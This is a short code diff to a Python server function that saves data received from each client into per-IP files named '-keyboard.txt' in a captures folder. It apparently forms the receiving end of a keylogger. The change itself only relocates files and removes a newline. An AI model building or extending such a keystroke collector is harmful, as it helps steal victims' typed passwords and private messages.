@@ -38,9 +38,8 @@ def handle_client(conn, addr):
 
             if data:
 
-                cwd = Path.cwd()
-                fic = list(cwd.glob(f"{addr[0]}*.txt"))
-                filename = f"{addr[0]}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt"
+                fic = list(path_captures.glob(f"{addr[0]}*.txt"))
+                filename = path_captures / f"{addr[0]}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt"
                 
                 if fic == []:
                     with open(filename, 'w') as file:
@@ -48,7 +47,6 @@ def handle_client(conn, addr):
                 else:
                     ficfilename = fic[0]
                     with open(ficfilename, 'a') as file:
-                        file.write("\n")
                         file.write(data)
                     os.rename(ficfilename,filename)
 
